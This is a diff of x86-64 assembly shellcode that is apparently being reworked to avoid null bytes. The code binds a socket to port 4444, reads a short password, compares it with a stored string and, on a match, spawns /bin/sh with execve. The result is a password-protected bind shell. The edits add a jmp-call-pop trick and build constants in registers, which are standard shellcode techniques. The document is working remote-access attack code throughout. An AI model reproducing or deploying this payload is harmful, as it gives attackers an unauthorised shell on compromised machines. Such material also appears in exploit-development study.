@@ -5,7 +5,7 @@ global _start
 section .text
 _start:	
 	;Resetting the register
-	cld
+	
 	
 	xor rax,rax
 	mov rsi,rax
@@ -14,6 +14,8 @@ _start:
 	mov r8,rdx
 	mov rcx,r8
 	mov rbx,rcx
+		
+
 	;Step1: Create a socket using the socket syscall
 	;format of the socket call as displayed by man socket
 	; int socket(int domain, int type, int protocol)
@@ -22,7 +24,7 @@ _start:
 	; Protocol number is 0 for INANYADDR
 	; The socket object fd(file descriptor) is returned and stored in rax
 	; Syscall of socket for x86 is 41 (can be found in unistd.h or looked up online)
-	
+
 	xor rax,rax
 	mov rdx,rax
 	mov al,41
@@ -50,13 +52,15 @@ _start:
 	;bzero is 8 zeros
 	xor rax,rax
 	push rax
-	
+	xor rbx,rbx
+	inc rbx
+	inc rbx
 	;INADDR_ANY is 0, and it has size 4 bytes in struct (int in C)
 	mov dword [rsp-4],eax
 	;port number to bind to, must be in bigendian(network byte) (2 bytes), 4444 will be 0x5c11
 	mov word [rsp-6],0x5c11
 	;this argument is	also 2 bytes long
-	mov word [rsp-8],0x2
+	mov word [rsp-8],bx
 	;4+2+2=8 bytes,decrement rsp by 8
 	sub rsp,8
 	;this is the address to be referred by the rsi
@@ -133,10 +137,12 @@ _start:
 	xor rax,rax
 	inp: db "xxxxxxxx"	
 	;Reading Input
-l2:
+l2:	
+	xor rdi,rdi
+	mov rdx,rdi
 	mov dil,al
 	lea rsi,[rel inp]
-	mov dl,64
+	mov dl,10
 	syscall
 	
 	jmp l3
@@ -151,18 +157,19 @@ l3:
 	mov cl,5
 	rep cmpsb 
 	jz ExecCall
-exiting:
-	;ExitSyscall	
+
+exiting:	
 	xor rax,rax
 	mov al,60
-	mov dil,0
+	mov rdi,rax
 	syscall
-	;Compare string
-	;Call Execve
-
 ExecCall:
+	jmp l4
+
+
+Execve:
 	xor rax,rax
-	lea rdi, [rel hw]
+	pop rdi
 	mov [rdi+7], byte al
 	mov [rdi+8], rdi
 	mov [rdi+16],rax
@@ -171,5 +178,7 @@ ExecCall:
 	lea rdx,[rdi+16]
 	mov al,59
 	syscall
-	
-	hw: db "/bin/sh"
+
+l4:
+	call Execve
+	str2: db "/bin/shX"
